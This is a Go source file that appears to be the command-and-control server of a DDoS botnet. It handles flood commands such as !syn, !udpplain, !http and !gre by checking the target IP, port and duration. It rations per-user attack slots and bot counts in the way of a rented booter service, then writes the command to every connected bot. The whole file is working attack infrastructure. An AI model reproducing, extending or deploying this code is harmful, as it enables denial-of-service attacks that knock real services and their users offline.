package handlers

import (
	"cnc/internal/config"
	"cnc/internal/models"
	"cnc/internal/state"
	"cnc/internal/ui"
	"cnc/internal/util"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func decrementSlots(user *models.User) {
	state.UsersMutex.Lock()
	user.CurrentSlots--
	if user.CurrentSlots < 0 {
		user.CurrentSlots = 0
	}
	state.UsersMutex.Unlock()

	state.CooldownMutex.Lock()
	state.CurrentGlobalSlots--
	if state.CurrentGlobalSlots < 0 {
		state.CurrentGlobalSlots = 0
	}
	state.CooldownMutex.Unlock()
}

func canStartAttack(user *models.User, conn net.Conn) bool {
	state.UsersMutex.Lock()
	if user.MaxSlots > 0 && user.CurrentSlots >= user.MaxSlots {
		util.WriteToConn(conn, ui.RED+"\rYour attack slots are full. Wait for an attack to finish.\n"+ui.RESET)
		state.UsersMutex.Unlock()
		return false
	}
	user.CurrentSlots++
	state.UsersMutex.Unlock()

	settings, err := config.ReadSettings()
	if err != nil {
		util.WriteToConn(conn, ui.RED+"\rError reading settings.\n"+ui.RESET)
		state.UsersMutex.Lock()
		user.CurrentSlots--
		state.UsersMutex.Unlock()
		return false
	}

	state.CooldownMutex.Lock()
	if settings.MaxGlobalSlots > 0 && state.CurrentGlobalSlots >= settings.MaxGlobalSlots {
		util.WriteToConn(conn, ui.RED+"\rGlobal attack slots are full. Wait for an attack to finish.\n"+ui.RESET)
		state.CooldownMutex.Unlock()
		state.UsersMutex.Lock()
		user.CurrentSlots--
		state.UsersMutex.Unlock()
		return false
	}
	state.CurrentGlobalSlots++
	state.CooldownMutex.Unlock()

	return true
}

func isAttackCommand(command string) bool {
	attacks := []string{"!udpcustom", "!syn", "!ack", "!http", "!icmp", "!gre", "!udpplain"}
	for _, attack := range attacks {
		if strings.HasPrefix(command, attack) {
			return true
		}
	}
	return false
}

func parseOptionalArgs(args []string) map[string]string {
	opts := make(map[string]string)
	for _, arg := range args {
		parts := strings.SplitN(arg, "=", 2)
		if len(parts) == 2 {
			opts[parts[0]] = parts[1]
		}
	}
	return opts
}

func HandleLayer3AttackCommand(user *models.User, command string, conn net.Conn) {
	parts := strings.Fields(command)
	if len(parts) < 3 {
		util.WriteToConn(conn, fmt.Sprintf(ui.RED+"\rUsage "+ui.WHITE+": %s "+ui.RED+" "+ui.WHITE+"<"+ui.RED+"ipv4"+ui.WHITE+"> <"+ui.RED+"time"+ui.WHITE+"> ["+ui.RED+"options"+ui.WHITE+"]\033[0m\n"+ui.RESET, parts[0]))
		return
	}

	ip, timeStr := parts[1], parts[2]
	optionalArgs := parseOptionalArgs(parts[3:])

	timeVal, err := strconv.Atoi(timeStr)
	if err != nil || !util.ValidateIPOrSubnet(ip) || timeVal <= 0 || timeVal > user.MaxTime {
		util.WriteToConn(conn, ui.RED+"\rInvalid IP or time\033[0m\n"+ui.RESET)
		return
	}

	if util.IsBlacklisted(ip) {
		util.WriteToConn(conn, ui.RED+"\rError: Target is blacklisted or private\033[0m\n"+ui.RESET)
		return
	}

	if !canStartAttack(user, conn) {
		return
	}

	var botCmdBuilder strings.Builder
	botCmdBuilder.WriteString(command)

	botcount := user.MaxBots
	if bcStr, ok := optionalArgs["botcount"]; ok {
		if bc, err := strconv.Atoi(bcStr); err == nil && bc > 0 && bc <= user.MaxBots {
			botcount = bc
		} else if bc > user.MaxBots {
			util.WriteToConn(conn, fmt.Sprintf(ui.RED+"\rCancelled attack, your max bots are (%d)\033[0m\n"+ui.RESET, user.MaxBots))
			decrementSlots(user)
			return
		}
	}

	sentBots := 0
	state.BotMutex.Lock()
	for i := 0; i < state.BotCount && sentBots < botcount; i++ {
		if state.Bots[i].IsValid {
			state.Bots[i].Conn.Write([]byte(botCmdBuilder.String()))
			sentBots++
		}
	}
	state.BotMutex.Unlock()

	state.CooldownMutex.Lock()
	state.GlobalCooldown = timeVal
	state.CooldownMutex.Unlock()

	message := fmt.Sprintf(ui.GREEN+"Successfully "+ui.GREY2+"sent attack to %s for "+ui.WHITE+"%d "+ui.GREY2+"seconds with "+ui.WHITE+"%d "+ui.GREY2+"bots\n"+
		ui.GREY2+"You are using "+ui.WHITE+"%d"+ui.GREY2+"/"+ui.WHITE+"%d slots\033[0m\n"+ui.RESET,
		ip, timeVal, sentBots, user.CurrentSlots, user.MaxSlots,
	)
	util.WriteToConn(conn, message)
	time.AfterFunc(time.Duration(timeVal)*time.Second, func() {
		decrementSlots(user)
	})
}

func HandleAttackCommand(user *models.User, command string, conn net.Conn) {
	parts := strings.Fields(command)
	if len(parts) < 4 {
		util.WriteToConn(conn, fmt.Sprintf(ui.RED+"\rUsage "+ui.WHITE+": %s "+ui.RED+" "+ui.WHITE+"<"+ui.RED+"ipv4"+ui.WHITE+"> <"+ui.RED+"port"+ui.WHITE+"> <"+ui.RED+"time"+ui.WHITE+"> ["+ui.RED+"options"+ui.WHITE+"]\033[0m\n"+ui.RESET, parts[0]))
		return
	}

	ip, portStr, timeStr := parts[1], parts[2], parts[3]
	optionalArgs := parseOptionalArgs(parts[4:])

	port, errPort := strconv.Atoi(portStr)
	timeVal, errTime := strconv.Atoi(timeStr)

	if errPort != nil || errTime != nil || !util.ValidateIPOrSubnet(ip) || !util.ValidatePort(port) || timeVal <= 0 || timeVal > user.MaxTime {
		util.WriteToConn(conn, ui.RED+"\rInvalid IP, port, or time\033[0m\n"+ui.RESET)
		return
	}

	if util.IsBlacklisted(ip) {
		util.WriteToConn(conn, ui.RED+"\rError: Target is blacklisted or private\033[0m\n"+ui.RESET)
		return
	}

	if !canStartAttack(user, conn) {
		return
	}

	var botCmdBuilder strings.Builder
	botCmdBuilder.WriteString(command)

	botcount := user.MaxBots
	if bcStr, ok := optionalArgs["botcount"]; ok {
		if bc, err := strconv.Atoi(bcStr); err == nil && bc > 0 && bc <= user.MaxBots {
			botcount = bc
		} else if bc > user.MaxBots {
			util.WriteToConn(conn, fmt.Sprintf(ui.RED+"\rCancelled attack, your max bots are (%d)\033[0m\n"+ui.RESET, user.MaxBots))
			decrementSlots(user)
			return
		}
	}

	sentBots := 0
	state.BotMutex.Lock()
	for i := 0; i < state.BotCount && sentBots < botcount; i++ {
		if state.Bots[i].IsValid {
			state.Bots[i].Conn.Write([]byte(botCmdBuilder.String()))
			sentBots++
		}
	}
	state.BotMutex.Unlock()

	state.CooldownMutex.Lock()
	state.GlobalCooldown = timeVal
	state.CooldownMutex.Unlock()

	message := fmt.Sprintf(ui.GREEN+"Successfully "+ui.GREY2+"sent attack to %s:%d for "+ui.WHITE+"%d "+ui.GREY2+"seconds with "+ui.WHITE+"%d "+ui.GREY2+"bots\r\n"+
		ui.GREY2+"You are using "+ui.WHITE+"%d"+ui.GREY2+"/"+ui.WHITE+"%d slots\033[0m\n"+ui.RESET,
		ip, port, timeVal, sentBots, user.CurrentSlots, user.MaxSlots,
	)
	util.WriteToConn(conn, message)
	time.AfterFunc(time.Duration(timeVal)*time.Second, func() {
		decrementSlots(user)
	})
}